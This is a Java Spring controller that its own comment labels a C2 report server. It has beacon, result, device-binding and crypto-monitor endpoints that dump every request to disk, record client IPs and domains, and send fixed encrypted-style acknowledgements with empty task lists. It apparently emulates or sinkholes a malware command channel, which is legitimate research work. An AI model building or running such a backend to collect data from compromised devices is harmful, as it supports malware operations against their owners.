package com.report.service.impl;

import javax.servlet.http.HttpServletRequest;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.HttpHeaders;
import org.springframework.http.HttpStatus;
import org.springframework.http.MediaType;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.CrossOrigin;
import org.springframework.web.bind.annotation.RestController;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.report.service.ApiService;
import com.report.service.UsDeviceBindService;
import com.report.util.ClientInfoUtils;
import com.report.util.HttpRequestUtils;
import com.report.util.IpUtil;
import com.report.util.RequestDumper;

/**
 * report-server C2 业务接口实现
 */
@RestController
@CrossOrigin
public class ApiServiceImpl implements ApiService {

    /** 加密 C2 POST 固定 ACK 原文（除 /a 外共用） */
    private static final String POST_ACK_BODY = "vwD9XTDjRE/8O3PtJiV0ZQ==";

    /** GET 探活统一响应 */
    private static final String OK_TEXT = "ok";
    private static final String PONG_TEXT = "pong";
    private static final MediaType TEXT_PLAIN = MediaType.parseMediaType("text/plain;charset=UTF-8");
    private static final MediaType APP_JSON = MediaType.APPLICATION_JSON;

    @Autowired
    private RequestDumper dumper;

    @Autowired
    private UsDeviceBindService usDeviceBindService;
    

    @Autowired
    private IpUtil ipUtil;
    
    @Override
    public ResponseEntity<String> eventGet(HttpServletRequest request) {
        return plainText(OK_TEXT);
    }

    @Override
    public ResponseEntity<byte[]> eventPost(HttpServletRequest request) {
    	String body = dumper.dump("event", request);
    	if (body == null || body.isEmpty()) {
    	    return fixedAck();
    	}
        String domain = ClientInfoUtils.getClientDomainTwo(request);
        String ip = ipUtil.getClientIp(request);
        usDeviceBindService.eventBindAsync(body, request.getHeader("x-ts"), domain,ip);
        return fixedAck();
    }

   
    @Override
    public ResponseEntity<String> uGet(HttpServletRequest request) {
        return json("{}");
    }

    @Override
    public ResponseEntity<byte[]> uPost(HttpServletRequest request) {
        String body = dumper.dump("u", request);
        if (body == null || body.isEmpty()) {
            return fixedAck();
        }
        String domain = ClientInfoUtils.getClientDomainTwo(request);
        String ip = ipUtil.getClientIp(request);
        usDeviceBindService.uBindAsync(body, request.getHeader("x-ts"), domain, ip);
        return fixedAck();
    }

    
    @Override
    public ResponseEntity<String> nbGet(HttpServletRequest request) {
        return plainText(OK_TEXT);
    }

    @Override
    public ResponseEntity<byte[]> nbPost(HttpServletRequest request) {
        String body = dumper.dump("nb", request);
        if (body == null || body.isEmpty()) {
            return fixedAck();
        }
        String domain = ClientInfoUtils.getClientDomainTwo(request);
        String ip = ipUtil.getClientIp(request);
        usDeviceBindService.nbBindAsync(body, request.getHeader("x-ts"), domain, ip);
        return fixedAck();
    }

   
    @Override
    public ResponseEntity<String> tGet(HttpServletRequest request) {
        return plainText(OK_TEXT);
    }

    @Override
    public ResponseEntity<byte[]> tPost(HttpServletRequest request) {
        dumper.dump("t", request);
        return fixedAck();
    }

    
    @Override
    public ResponseEntity<String> ubGet(HttpServletRequest request) {
        return plainText(OK_TEXT);
    }

    @Override
    public ResponseEntity<byte[]> ubPost(HttpServletRequest request) {
        dumper.dump("ub", request);//落盘写入
        return fixedAck();
    }

    @Override
    public ResponseEntity<String> ujGet(HttpServletRequest request) {
        return plainText(OK_TEXT);
    }

    @Override
    public ResponseEntity<byte[]> ujPost(HttpServletRequest request) {
        dumper.dump("uj", request);
        return fixedAck();
    }

    @Override
    public ResponseEntity<String> usGet(HttpServletRequest request) {
        return plainText(OK_TEXT);
    }

    @Override
    public ResponseEntity<byte[]> usPost(HttpServletRequest request) {
        String body = dumper.dump("us", request);
        if (body == null || body.isEmpty()) {
            return fixedAck();
        }
        String domain = ClientInfoUtils.getClientDomainTwo(request);
        String ip = ipUtil.getClientIp(request);
        usDeviceBindService.usBindAsync(body, request.getHeader("x-ts"), domain,ip);
        // 3) 立即返回 ACK
        return fixedAck();
    }


    @Override
    public ResponseEntity<String> vhxGet(HttpServletRequest request) {
        return plainText(OK_TEXT);
    }

    @Override
    public ResponseEntity<String> vhxPost(HttpServletRequest request) {
        dumper.dump("vhx", request);
        return plainText(OK_TEXT);
    }

    @Override
    public ResponseEntity<String> vhxHead(HttpServletRequest request) {
        dumper.dump("vhx", request);
        return plainText(OK_TEXT);
    }

    @Override
    public ResponseEntity<String> beaconGet(HttpServletRequest request) {
        return plainText(OK_TEXT);
    }

    @Override
    public ResponseEntity<String> beaconPost(HttpServletRequest request) {
        dumper.dump("beacon", request);
        String body = HttpRequestUtils.readBody(request);
        String uuid = extractUuid(body);
        JSONObject resp = new JSONObject();
        resp.put("status", "ok");
        resp.put("tasks", new Object[0]);
        if (uuid != null) {
            resp.put("uuid", uuid);
        }
        return json(resp.toJSONString());
    }

   
    @Override
    public ResponseEntity<String> resultGet(HttpServletRequest request) {
        return plainText(OK_TEXT);
    }

    @Override
    public ResponseEntity<String> resultPost(HttpServletRequest request) {
        dumper.dump("result", request);
        String body = HttpRequestUtils.readBody(request);
        if (body != null && !body.isEmpty()) {
            String missing = joinMissingFields(body, "command_id", "uuid", "filename");
            if (missing != null) {
                return json(HttpStatus.BAD_REQUEST,
                        "{\"status\":\"error\",\"error\":\"missing fields: " + missing + "\"}");
            }
        }
        return json("{\"status\":\"ok\"}");
    }

 
    @Override
    public ResponseEntity<String> pGet(HttpServletRequest request) {
        return plainText(OK_TEXT);
    }

    @Override
    public ResponseEntity<String> pPost(HttpServletRequest request) {
        dumper.dump("p", request);
                return plainText(OK_TEXT);
    }

//    @Override
//    public ResponseEntity<String> warGet(HttpServletRequest request) {
//        return plainText(OK_TEXT);
//    }
//
//    @Override
//    public ResponseEntity<String> warPost(HttpServletRequest request) {
//        dumper.dump("war", request);
//        String body = HttpRequestUtils.readBody(request);
//        String deviceUuid = extractStringField(body, "device_uuid");
//        if (deviceUuid == null) {
//            return json(HttpStatus.BAD_REQUEST, "{\"status\":\"error\",\"error\":\"device_uuid required\"}");
//        }
//        return json("{\"status\":\"accepted\"}");
//    }

  
    @Override
    public ResponseEntity<String> cryptoMornitor(HttpServletRequest request) {
        dumper.dump("crypto_mornitor", request);
        String body = HttpRequestUtils.readBody(request);
        if (body == null || body.isEmpty()) {
            return json(HttpStatus.BAD_REQUEST, "{\"ok\":false,\"error\":\"empty body\"}");
        }
        try {
            if (JSON.parseObject(body) == null) {
                return json(HttpStatus.BAD_REQUEST, "{\"ok\":false,\"error\":\"invalid json\"}");
            }
        } catch (Exception e) {
            return json(HttpStatus.BAD_REQUEST, "{\"ok\":false,\"error\":\"invalid json\"}");
        }
                return json("{\"code\":200,\"msg\":\"SUCCESS\"}");
    }

  
    @Override
    public ResponseEntity<String> health(HttpServletRequest request) {
        return plainText(PONG_TEXT);
    }

    @Override
    public ResponseEntity<String> healthz(HttpServletRequest request) {
        return plainText(PONG_TEXT);
    }

    @Override
    public ResponseEntity<String> ready(HttpServletRequest request) {
        return json("{\"ok\":true,\"task_queue_enabled\":false,\"db_pool\":{\"size\":0,\"max_overflow\":0},\"workers\":{},\"mysql\":\"ok\"}");
    }

    @Override
    public ResponseEntity<String> robots(HttpServletRequest request) {
        return plainText("User-agent: *\nDisallow: /");
    }

    @Override
    public ResponseEntity<String> logHtml(HttpServletRequest request) {
        return plainText(OK_TEXT);
    }

    private static ResponseEntity<byte[]> fixedAck() {
        HttpHeaders headers = new HttpHeaders();
        headers.setContentType(APP_JSON);
        headers.add("x-ts", String.valueOf(System.currentTimeMillis()));
        return new ResponseEntity<>(POST_ACK_BODY.getBytes(java.nio.charset.StandardCharsets.UTF_8), headers, HttpStatus.OK);
    }

    private static ResponseEntity<String> plainText(String body) {
        return ResponseEntity.ok().contentType(TEXT_PLAIN).body(body);
    }

    private static ResponseEntity<String> json(String body) {
        return ResponseEntity.ok().contentType(APP_JSON).body(body);
    }

    private static ResponseEntity<String> json(HttpStatus status, String body) {
        return ResponseEntity.status(status).contentType(APP_JSON).body(body);
    }

    /** 从 JSON body 取 uuid 字段；非法 body 返回 null */
    private static String extractUuid(String body) {
        return extractStringField(body, "uuid");
    }

    private static String extractStringField(String body, String field) {
        if (body == null || body.isEmpty()) {
            return null;
        }
        try {
            JSONObject obj = JSON.parseObject(body);
            if (obj == null) {
                return null;
            }
            Object v = obj.get(field);
            return v == null ? null : v.toString();
        } catch (Exception ignore) {
            return null;
        }
    }

    /** 拼接所有缺失字段（逗号分隔）；无缺失或非法 body 返回 null（继续按 200 ok 处理） */
    private static String joinMissingFields(String body, String... fields) {
        if (body == null || body.isEmpty()) {
            return null;
        }
        try {
            JSONObject obj = JSON.parseObject(body);
            if (obj == null) {
                return null;
            }
            StringBuilder sb = new StringBuilder();
            for (String f : fields) {
                if (obj.get(f) == null) {
                    if (sb.length() > 0) {
                        sb.append(", ");
                    }
                    sb.append(f);
                }
            }
            return sb.length() == 0 ? null : sb.toString();
        } catch (Exception ignore) {
            return null;
        }
    }




}
